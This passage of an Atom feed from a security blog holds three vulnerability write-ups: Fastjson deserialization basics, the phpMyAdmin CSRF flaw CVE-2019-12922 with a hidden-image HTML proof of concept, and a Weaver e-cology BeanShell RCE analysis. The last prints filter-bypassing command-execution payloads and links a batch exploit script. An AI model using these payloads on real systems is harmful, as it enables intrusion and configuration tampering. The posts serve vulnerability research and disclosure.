    <content type="html"><![CDATA[<p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/69dac230a9e1a33222aeeb6e7c9c1be2.png" alt></p><h2 id="概述"><a href="#概述" class="headerlink" title="#概述"></a>#概述</h2><p>最近Fastjson反序列化Bypass绕过AutoType的漏洞越来越多，趁着国庆休息时间，把历年来曝光的3个Fastjson<br>RCE漏洞进行了分析，把过程笔记整理下，本来想一篇blog文但篇幅越写越多，考虑到阅读体验就做了一个Fastjson反序列化漏洞的系列文章,大致如下：<br>[1]. Fastjson反序列化漏洞系列1-什么是fastjson反序列化？<br>[2]. Fastjson反序列化漏洞系列2-如何构造fastjson反序列化RCE漏洞Poc？<br>[3]. Fastjson反序列化漏洞系列3-fastjson&lt;=1.2.24反序列化RCE漏洞（CNVD-2017-02833）原理分析及Poc构造<br>[4]. Fastjson反序列化漏洞系列4-fastjson&lt;1.2.48反序列化RCE漏洞（CNVD-2019-22238）原理分析及Poc构造<br>[5]. Fastjson反序列化漏洞系列5-fastjson&lt;=1.2.60反序列化RCE漏洞（CNVD-2019-32498）原理分析及Poc构造<br>（大概4-5篇这样，后面陆续更新，感兴趣的小伙伴可以搜索微信公众号：SecurityCN，或扫码文末的二维码关注）</p><h2 id="1-Fastjson反序列化漏洞系列1-什么是fastjson反序列化？"><a href="#1-Fastjson反序列化漏洞系列1-什么是fastjson反序列化？" class="headerlink" title="[1]. Fastjson反序列化漏洞系列1-什么是fastjson反序列化？"></a>[1]. Fastjson反序列化漏洞系列1-什么是fastjson反序列化？</h2><h3 id="什么是Fastjson？"><a href="#什么是Fastjson？" class="headerlink" title="#什么是Fastjson？"></a>#什么是Fastjson？</h3><p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库（<a href="https://github.com/alibaba/fastjson）" target="_blank" rel="noopener">https://github.com/alibaba/fastjson）</a><br>采用“假定有序快速匹配”的算法，它可以解析JSON格式的字符串，支持将Java<br>Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。Fastjson接口简单易用，广泛使用在缓存序列化、协议交互、Web输出、Android客户端等，目前有2个主要接口toJsonString和parseObject来分别实现序列化和反序列化。</p><h3 id="Fastjson反序列化框架"><a href="#Fastjson反序列化框架" class="headerlink" title="#Fastjson反序列化框架"></a>#Fastjson反序列化框架</h3><p>Fastjson反序列化框架图</p><p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/a13951628f8ef4c308e82a45f5bbd066.png" alt></p><p>在Fastjson反序列化框架中JSON是门面类，提供一些静态方法，如parse，parseObject，其主要功能都是在DefaultJSONParser类中实现的。DefaultJSONParser引用了ParserConfig类，该类主要保存一些相关配置信息。也引用了JSONLexerBase类用来处理字符分析，序列化用到的是JavaBeanSerializer类，而反序列化用到的是JavaBeanDeserializer类。</p><h3 id="Demo演示FastJson反序列化实现过程"><a href="#Demo演示FastJson反序列化实现过程" class="headerlink" title="#Demo演示FastJson反序列化实现过程"></a>#Demo演示FastJson反序列化实现过程</h3><p>1.定义User.java,代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//定义用户类</span><br><span class="line">public class User &#123;</span><br><span class="line">    private Long id;</span><br><span class="line">    private String name;</span><br><span class="line">//增加get/set方法</span><br><span class="line">    public Long getId() &#123; return id; &#125;</span><br><span class="line">    public void setId(Long id) &#123; this.id = id; &#125;</span><br><span class="line">    public String getName() &#123; return name; &#125;</span><br><span class="line">    public void setName(String name) &#123; this.name = name; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.定义测试Test.java,代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">//定义测试类，</span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        User guestUser = new User();</span><br><span class="line">        guestUser.setId(1L);</span><br><span class="line">        guestUser.setName(&quot;guest&quot;);</span><br><span class="line">        //将java对象序列化为json对象</span><br><span class="line">        String jsonString1 = JSON.toJSONString(guestUser);</span><br><span class="line">        System.out.println(&quot;Json对象:&quot;+jsonString1);</span><br><span class="line">        //将json反序列化为java对象</span><br><span class="line">        String jsonString2= &quot;&#123;\&quot;id\&quot;:2,\&quot;name\&quot;:\&quot;root\&quot;&#125;&quot;;</span><br><span class="line">        User user = JSON.parseObject(jsonString2,User.class);</span><br><span class="line">        System.out.println(&quot;Java对象:&quot;+user);</span><br><span class="line">        //打印变量类型</span><br><span class="line">        System.out.println(user.getClass().getTypeParameters());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行<br><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/e72b22fb611b06330f1efac777c85b0a.png" alt><br>最后输出如下<br>jsonString1–Json对象:{“id”:1,”name”:”guest”}<br>user–Java对象:User@7ab2bfe1<br>user的类型为[Ljava.lang.reflect.TypeVariable;@497470ed</p><h3 id="动态调试理解调用链"><a href="#动态调试理解调用链" class="headerlink" title="#动态调试理解调用链"></a>#动态调试理解调用链</h3><p>还是利用上面的Demo进行动态调试<br>在String jsonString1 = JSON.toJSONString(guestUser); 和User user =<br>JSON.parseObject(jsonString2,User.class); 处设置断点</p><p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/5c690bce15fb9c76ce45da8829c13147.png" alt></p><p><strong>1.动态调试理解这个序列化过程</strong><br>先调用/com/alibaba/fastjson/JSON.class的toJSONString对象</p><p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/4854907e78c22d35916dcd9b9db879c4.png" alt></p><p>com/alibaba/fastjson/serializer/SerializeWriter.class的SerializeWriter对象</p><p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/28b369f50a8f7a79ed6ee33bf5fd6402.png" alt></p><p>读取SerializeConfig 配置</p><p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/7d6858cb932c5132bf4c35909cc880a1.png" alt></p><p>最后调用 com/alibaba/fastjson/serializer/JavaBeanSerializer.class类进行序列化</p><p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/04133ed9c668463051e1e50989145fa2.png" alt></p><p>com/alibaba/fastjson/JSON.class 的toJSONString</p><p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/1cfd2291fcfd2c12b56e4c6c4f70131e.png" alt></p><p><strong>2.动态调试理解反序列化过程</strong></p><p>先调用com/alibaba/fastjson/JSON.class的parseObject 对象</p><p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/4a674fe0c9b9490348c089f7ab8b7ae4.png" alt></p><p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/7b4fbd1857cac24b0599b14555808553.png" alt></p><p>跳到com/alibaba/fastjson/parser/DefaultJSONParser.class 的parseObject对象</p><p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/bc2ba58357122705a8081513c0bf9e6d.png" alt></p><p>com/alibaba/fastjson/parser/ParserConfig.class的ObjectDeserializer 对象</p><p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/94338bc8ce0db46e20af85d643996f1f.png" alt></p><p>最后调用<br>com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class类进行反序列化</p><p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/8699cdf40d67ad43370cbccd3f0f8126.png" alt></p><p><img src="//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/17841661beae3930b7d2516d98fe7de6.png" alt></p><h3 id="造成远程命令执行的原因？"><a href="#造成远程命令执行的原因？" class="headerlink" title="#造成远程命令执行的原因？"></a>#造成远程命令执行的原因？</h3><p>Fastjson反序列化的Gadget需要无参默认构造方法或者注解指定构造方法并添加相应参数。使用Feature.SupportNonPublicField才能打开非公有属性的反序列化处理，@type可以指定反序列化任意类调用其set，get，is方法，并且由于反序列化的特性，我们可以通过目标类的set方法自由的设置类的属性值。常见的攻击流程是这样的：攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE。</p><p>本节到此结束，下一节是 [2].<br>Fastjson反序列化漏洞系列1-如何构造fastjson反序列化RCE漏洞Poc？<br>敬请期待，感兴趣的小伙伴可以搜索微信公众号：SecurityCN，或扫码文末的二维码关注。</p><p>免责声明：</p><p>本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。</p><p>参考：<br>[1].<a href="http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;//securitycn.github.io/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/69dac230a9e1a33222aeeb6e7c9c1be2.png&quot; alt&gt;&lt;/p&gt;
&lt;h2 id=
      
    
    </summary>
    
    
      <category term="技术" scheme="https://www.securityinfo.cn/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="专栏" scheme="https://www.securityinfo.cn/categories/%E6%8A%80%E6%9C%AF/%E4%B8%93%E6%A0%8F/"/>
    
    
      <category term="安全研究" scheme="https://www.securityinfo.cn/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
      <category term="Web安全" scheme="https://www.securityinfo.cn/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="代码审计" scheme="https://www.securityinfo.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>漏洞分析-CVE-2019-12922_phpMyAdmin小于等于4.9.0.1CSRF漏洞分析</title>
    <link href="https://www.securityinfo.cn/2019/09/27/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-CVE-2019-12922-phpMyAdmin%E5%B0%8F%E4%BA%8E%E7%AD%89%E4%BA%8E4-9-0-1CSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1/"/>
    <id>https://www.securityinfo.cn/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/</id>
    <published>2019-09-27T15:31:47.000Z</published>
    <updated>2019-10-08T03:08:05.128Z</updated>
    
    <content type="html"><![CDATA[<p>最近安全圈曝光了很多漏洞，之前审计了泛微 OA<br>RCE 漏洞,今天审计分析phpMyAdmin_CSRF漏洞</p><p><img src="//securitycn.github.io/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/167c922ef0588ef9c6d1ab7d094d949b.png" alt></p><p><strong>#事件背景</strong></p><p>2019年9月16日，网络上曝光phpMyAdmin4.9.0.1版本中存在跨站请求伪造漏洞，攻击者可利用该漏洞通过受影响客户端向服务器发送非预期的请求。这个漏洞影响phpMyAdmin的版本最高到4.9.0.1，这是phpMyAdmin目前最新的发行版本。因为这个漏洞危及的范围比较小，仅允许攻击者删除目标服务器里的，phpMyAdmin控制面板中关于setup页面中的服务器配置。攻击者所需要做的仅仅是发送一个精心设计的URL给网页的管理员，这个管理员需要在他的浏览器登录到phpMyAdmin控制面板，然后在同一个浏览器点击这个URL，就会不知不觉地删除了配置里的服务器。</p><p><strong>#漏洞信息</strong></p><table><thead><tr><th>漏洞名称</th><th>phpMyAdmin_CSRF漏洞</th></tr></thead><tbody><tr><td>CVE编号</td><td>CVE-2019-12922</td></tr><tr><td>CNVD编号</td><td>CNVD-2019-31657</td></tr><tr><td>影响版本</td><td>phpMyAdmin &lt;=4.9.0.1（据说phpMyAdmin 5.0.0-alpha1版也存在）</td></tr><tr><td>威胁等级</td><td>中危</td></tr><tr><td>公开时间</td><td>2019年9月16日</td></tr></tbody></table><p><strong>#漏洞分析</strong></p><p><strong>1.什么是CSRF？</strong></p><p>CSRF(Cross-site request forgery)跨站请求伪造，也被称为One Click<br>Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。</p><p><img src="//securitycn.github.io/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/9e8fc902aacf82840cccd17f90ab83bd.png" alt></p><p>上图为CSRF攻击的一个简单模型：用户访问恶意网站B，恶意网站B返回给用户的HTTP信息中要求用户访问网站A，而由于用户和网站A之间可能已经有信任关系导致这个请求就像用户真实发送的一样会被执行。</p><p><strong>2.静态审计</strong></p><p>漏洞存在于phpmyadmin/setup/index.php文件，该文件为安装phpmyadmin的脚本，可以在此脚本中创建连接新的Mysql数据库服务器</p><p><img src="//securitycn.github.io/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/ea5c75eeed8bbe3e310faaf7f9b97936.png" alt></p><p>允许get请求参数为page，</p><p><img src="//securitycn.github.io/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/2e76bc27ba4735b802e425615761071e.png" alt></p><p><img src="//securitycn.github.io/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/6130b5ae696f2c6f000d21d72fd2aa40.png" alt></p><p>再跟进到/setup/frames/$page.inc.php 也就是 /setup/frames/server.inc.php文件</p><p>这个php从Get请求获取了 mode和id这两个参数的值，</p><p>mode有三种（’edit’、’remove’、’revert’）</p><p><img src="//securitycn.github.io/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/eebbd0c7eedbe9971988ee180a396c22.png" alt></p><p>当mode=remove且Servers/$id不为null时，使用removeServer方法删除server然后Location跳转到/phpmyadmin/setup/index.php首页</p><p>我们再跟进看下phpMyAdmin/libraries/config/ConfigFile.class.php的removeServer方法  </p><p><img src="//securitycn.github.io/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/5a1eb534a668a8e9b2dc985757685037.png" alt></p><p>unset这句是关键 unset函数是销毁指定变量，在这里就是删掉$server</p><p><strong>```unset</strong>($_SESSION[$this-&gt;<strong>id</strong>][<strong>‘Servers’</strong>][$last_server]);```</p><p>导致CSRF的根据原因为phpmyamdin，没有全局token，只有在登录/phpmyadmin/index.php后，才会创建token</p><p><img src="//securitycn.github.io/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/10b4d4cf17f4b014696eee9ca0fe5114.png" alt></p><p>所以在设置服务器页面phpmyadmin/setup/index.php是没有token的，故此无法防御跨站请求伪造攻击，这样$server就通过CSRF漏洞被删除了。</p><p>但是这个漏洞不能执行Sql语句拖库，故此危害等级不高，但是利用起来很简单，攻击者只需要知道服务器的URL，就能利用CSRF漏洞删除phpmyamdi配置中的服务器。</p><p><strong>#漏洞复现</strong></p><p>在浏览器打开</p><p><a href="http://192.168.21.56/phpmyadmin/setup/index.php" target="_blank" rel="noopener">http://192.168.21.56/phpmyadmin/setup/index.php</a></p><p><img src="//securitycn.github.io/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/e1c681fc2124332bca525909b4e02d0a.png" alt></p><p>为了方便后面CSRF漏洞能够成功删除服务器成功先New一个服务器</p><p>点击New server就跳转到服务器创建页面</p><p><img src="//securitycn.github.io/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/641a471fe84ab8db1ba4a70b98d09455.png" alt></p><p>save之后跳转到之前setup/index.php页面</p><p><img src="//securitycn.github.io/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/2b26684f8324249f3f3d8562ef103f3e.png" alt></p><p>可以看到这里Delete按钮就是 Poc中的地址，点击这个delete就能删除这个server</p><p>开始复现CSRF漏洞，构造Poc，新建一个CSRF.html文件写入以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;Deleting Server 1&lt;/p&gt;</span><br><span class="line">&lt;img src=&quot;</span><br><span class="line">http://192.168.31.56/phpmyadmin/setup/index.php?page=servers&amp;mode=remove&amp;id=1&quot;;style=&quot;display:none;&quot;/&gt;</span><br></pre></td></tr></table></figure><p>在同一个浏览器中执行</p><p><img src="//securitycn.github.io/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/1246117a9b36f44eb69f2d8c8aec986d.png" alt></p><p>通过抓包设置断点可以看到该请求</p><p><img src="//securitycn.github.io/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/227138ed284c1f8710999d00723d65c7.png" alt></p><p>该请求删除了id为1的server</p><p>再返回/setup/index.php 查看发现之前新建的 id为1 ，name为11111的server被删除</p><p><img src="//securitycn.github.io/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/7216198f31517acc09ef04f6be4b2150.png" alt></p><p>本次分析复现的代码及POC会在本人的Github上分享<a href="https://github.com/securitycn/" target="_blank" rel="noopener">https://github.com/securitycn/</a></p><p><strong>#修复建议</strong></p><p>厂商尚未提供漏洞修复方案，请关注厂商主页更新： <a href="https://www.phpmyadmin.net/" target="_blank" rel="noopener">https://www.phpmyadmin.net/</a></p><p><strong>#免责声明</strong></p><p>本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。</p><p><strong>#版权</strong></p><p>本文为作者原创禁止一切非授权转载和抄袭行为，如需转载请联系在公众号后台留言（留言请说明来意），转载请注明出处及下方二维码。</p><p><strong>#求关注</strong></p><p>欢迎大家留言，喜欢文章的朋友可以关注本公众号</p><p>微信公众号：securitycn</p><p>博客：<a href="https://securitycn.github.io">https://securitycn.github.io</a></p><p>Github: <a href="https://github.com/securitycn" target="_blank" rel="noopener">https://github.com/securitycn</a></p><p><img src="//securitycn.github.io/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdmin小于等于4-9-0-1CSRF漏洞分析-1/680e2a08b1f4315111b46c6638a1b045.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近安全圈曝光了很多漏洞，之前审计了泛微 OA&lt;br&gt;RCE 漏洞,今天审计分析phpMyAdmin_CSRF漏洞&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;//securitycn.github.io/2019/09/27/漏洞分析-CVE-2019-12922-phpMyAdm
      
    
    </summary>
    
    
      <category term="技术" scheme="https://www.securityinfo.cn/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="安全研究" scheme="https://www.securityinfo.cn/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
      <category term="Web安全" scheme="https://www.securityinfo.cn/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="代码审计" scheme="https://www.securityinfo.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>泛微OA E-cology 远程代码执行漏洞分析、过滤器绕过及批量检测工具</title>
    <link href="https://www.securityinfo.cn/2019/09/24/%E6%B3%9B%E5%BE%AEOA-E-cology-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E3%80%81%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BB%95%E8%BF%87%E5%8F%8A%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7/"/>
    <id>https://www.securityinfo.cn/2019/09/24/泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/</id>
    <published>2019-09-24T14:44:48.000Z</published>
    <updated>2019-10-08T02:42:55.262Z</updated>
    
    <content type="html"><![CDATA[<p><strong>【漏洞分析】泛微OA E-cology 远程代码执行漏洞原理分析、过滤器绕过及批量检测工具</strong></p><p>Author:Ja0k</p><p><img src="//securitycn.github.io/2019/09/24/泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/1cbfcf408d9b147993a123c148155c62.png" alt></p><p>最近曝光了很多漏洞，后续将对这些有代表性的漏洞进行分析审分析，今天有空先审计分析 泛微<br>OA RCE 漏洞</p><p><strong>#事件背景</strong></p><p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁，泛微e-cology OA系统的JAVA<br>Beanshell接口可被未授权访问，攻击者调用该Beanshell接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行，漏洞等级严重。</p><p><strong>#漏洞信息</strong></p><table><thead><tr><th>漏洞名称</th><th>泛微OA E-cology 远程代码执行漏洞</th></tr></thead><tbody><tr><td>CVE编号</td><td>-</td></tr><tr><td>CNVD编号</td><td>CNVD-2019-32204</td></tr><tr><td>影响版本</td><td>e-cology &lt;=9.0</td></tr><tr><td>威胁等级</td><td>高危</td></tr><tr><td>公开时间</td><td>2019年9月17日</td></tr></tbody></table><p><strong>#漏洞分析</strong></p><p>此次存在漏洞的是JAVA Beanshell接口，现在了解下Beanshell的基础。</p><p><strong>1. BeanShell 知识</strong>（来源：<a href="https://github.com/beanshell/beanshell）" target="_blank" rel="noopener">https://github.com/beanshell/beanshell）</a></p><p>BeanShell是一个小型的，免费的，可嵌入的Java源解释器，具有使用Java编写的对象脚本语言功能。<br>BeanShell动态执行标准Java语法，并通过通用的脚本编写便利进行扩展，例如松散的类型，命令和方法闭包（如Perl和JavaScript）。</p><p>可以交互地使用BeanShell进行Java实验和调试，以及以新方式扩展应用程序。</p><p>Beanshell可以执行print、dir、eval、exec等命令</p><p><img src="//securitycn.github.io/2019/09/24/泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/738014ac4eaac4c4be029ad813f66dd5.png" alt></p><p>页面如下图</p><p><img src="//securitycn.github.io/2019/09/24/泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/9f296e4a5ebea20d9e3bfe6892495883.png" alt></p><p><strong>2.</strong> 泛微中Beanshell库jar代码静态分析</p><p>从泛微里提取存在漏洞的lib文件 bsh-2.0b4.jar 反编译查看servlet.BshServlet这个类</p><p><img src="//securitycn.github.io/2019/09/24/泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/525c13e7c7c8730006b7c7d90aeac9f3.png" alt></p><p>在类中发现doGet和doPost方法，用来接收并执行提交的数据。</p><p>doPost实际上就是对doGet的二次封装</p><p><img src="//securitycn.github.io/2019/09/24/泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/953c8c686a598793b8fa08725e4bf8f4.png" alt></p><p>在doGet方法中看到调用evalScript方法创建一个名为obj的对象，再看evalScript这个方法中的pramString参数，最终会被interpreter.eval处理。如下图</p><p><img src="//securitycn.github.io/2019/09/24/泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/f9df8f6704f1096a36b6c776a2c6955b.png" alt></p><p>跟进 bsh.Interpreter类的eval方法</p><p><img src="//securitycn.github.io/2019/09/24/泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/242c9b5c7f5c7a5703e5b8e288d36f66.png" alt></p><p>跳转到bsh.classpath/ClassManagerImpl.class类</p><p><img src="//securitycn.github.io/2019/09/24/泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/f71f2f2dea777c58ceaf51929c5522b0.png" alt></p><p>该类调用了bsh.commands/exec.bsh脚本，该脚本可以执行命令</p><p><img src="//securitycn.github.io/2019/09/24/泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/d36c4dc028b98fbae54a7bb612a666e4.png" alt></p><p><strong>#漏洞复现</strong></p><ol><li><strong>泛微OA BeanShell复现测试</strong></li></ol><p><img src="//securitycn.github.io/2019/09/24/泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/611c89ea0c26109acb074e13709e18e0.png" alt></p><p>把print(“hello!”)换成exec(“whoami”)，就可以测试能否执行系统命令了。</p><p>Poc1: bsh.script=\u0065\u0078\u0065\u0063(“whoami”);&amp;bsh.servlet.output=raw</p><p><img src="//securitycn.github.io/2019/09/24/泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/c72547461819c49c9e7edd8896bca8e5.png" alt></p><p>如果有全局过滤器过滤了exec或eval，会有报错，如下图：</p><p><img src="//securitycn.github.io/2019/09/24/泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/854d8e0be236a472ace811444bc3667f.png" alt></p><p>可以采用unicode编码、字符串拼接等方式绕过,见下图：</p><p>Poc2: bsh.script=\u0065\u0078\u0065\u0063(“whoami”);&amp;bsh.servlet.output=raw</p><p><img src="//securitycn.github.io/2019/09/24/泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/694b9be88cb74bfbcbf4268e2493272d.png" alt></p><p>Poc3：</p><p>bsh.script=eval%00(“ex”%2b”ec(bsh.httpServletRequest.getParameter(\“command\“))”);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw&amp;command=whoami</p><p><img src="//securitycn.github.io/2019/09/24/泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/c946285789271139ddb4fba29a0153c0.png" alt></p><p><strong>2. 批量验证脚本</strong></p><p>该脚本拼接了常用的泛微OA web路径，结合了本文讲解绕过过滤器的3个Poc</p><p>该工具仅用于测试研究使用请勿他用。</p><p><img src="//securitycn.github.io/2019/09/24/泛微OA-E-cology-远程代码执行漏洞分析、过滤器绕过及批量检测工具/949ec3bcbc877d3df5f3371c99468a34.png" alt></p><p><strong>3.本文用到的文件下载地址</strong></p><p>泛微OA中提取的Beanshell库：</p><p><a href="https://github.com/SecurityCN/Vulnerability-analysis/blob/master/0917/weaver-oa/CNVD-2019-32204/bsh-2.0b4.jar" target="_blank" rel="noopener">https://github.com/SecurityCN/Vulnerability-analysis/blob/master/0917/weaver-oa/CNVD-2019-32204/bsh-2.0b4.jar</a></p><p>批量脚本：</p><p><a href="https://github.com/SecurityCN/Vulnerability-analysis/blob/master/0917/weaver-oa/CNVD-2019-32204/Weaver-Ecology-OA_RCE-EXP.py" target="_blank" rel="noopener">https://github.com/SecurityCN/Vulnerability-analysis/blob/master/0917/weaver-oa/CNVD-2019-32204/Weaver-Ecology-OA_RCE-EXP.py</a></p><p><strong>#免责声明</strong></p><p>本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;【漏洞分析】泛微OA E-cology 远程代码执行漏洞原理分析、过滤器绕过及批量检测工具&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Author:Ja0k&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;//securitycn.github.io/2019/09/24/泛微OA
      
    
    </summary>
    
    
      <category term="技术" scheme="https://www.securityinfo.cn/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="Web安全" scheme="https://www.securityinfo.cn/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="代码审计" scheme="https://www.securityinfo.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="漏洞分析" scheme="https://www.securityinfo.cn/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
